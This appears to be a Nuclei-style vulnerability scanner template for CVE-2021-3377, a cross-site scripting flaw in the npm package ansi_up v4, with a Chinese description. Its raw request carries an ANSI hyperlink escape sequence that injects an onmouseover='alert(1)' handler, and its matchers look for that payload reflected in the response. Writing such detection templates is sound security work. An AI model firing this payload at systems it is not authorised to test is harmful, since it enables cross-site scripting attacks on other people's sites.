id: CVE-2021-3377
info:
  name: npm ansi_up v4 - Cross-Site Scripting
  author:
  - geeknik
  description: |
    npm ansi_up v4 XSS漏洞
    ansi_up v4 是Npm中的一个包名。
    npm 包 ansi_up中将 ANSI 转义码转换为 HTML。 在 ansi_up v4 中，ANSI 转义码可用于创建 HTML 超链接。 此功能受到跨站点脚本 (XSS) 漏洞的影响。
  severity: medium
requests:
- matchers:
  - type: word
    part: header
    words:
    - text/html
  - type: word
    words:
    - com"/onmouseover="alert(1)">
  matchers-condition: and
  raw:
  - |+
    GET /\u001B]8;;https://example.com"/onmouseover="alert(1)\u0007example\u001B]8;;\u0007 HTTP/1.1
    Host: {{Hostname}}
    Connection: close

  unsafe: true
